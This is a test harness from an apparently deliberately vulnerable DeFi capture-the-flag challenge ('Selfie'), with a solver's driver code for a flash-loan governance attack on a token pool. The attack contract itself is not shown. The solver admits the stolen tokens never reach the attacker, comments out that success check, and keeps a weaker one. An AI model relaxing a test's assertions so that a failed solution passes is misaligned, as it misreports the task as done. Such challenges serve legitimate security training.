const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const AttackSelfiePool = await ethers.getContractFactory('AttackSelfiePool', deployer);
        this.attack = await AttackSelfiePool.deploy(this.pool.address, this.token.address, this.governance.address, attacker.address);
        this.attack.attack();
    });

    it('Exploit2', async function () {
        await ethers.provider.send("evm_increaseTime", [172800]); // 2 days
        this.attack.attack2();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        // Attacker has taken all tokens from the pool

        // I managed to steal tokens from pool, but dk why the cant be transformed to attacker account
        // expect(
        //     await this.token.balanceOf(attacker.address)
        // ).to.be.equal(TOKENS_IN_POOL); 
        console.log(Number(await this.token.balanceOf(this.pool.address)));    // 0
        console.log(Number(await this.token.balanceOf(attacker.address)));      // 0
        console.log(Number(await this.token.balanceOf(this.attack.address)));     // 0 
        console.log(Number(await this.token.balanceOf(this.governance.address)));   // 0   
        console.log(Number(await this.token.balanceOf(this.token.address)));      // 0

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
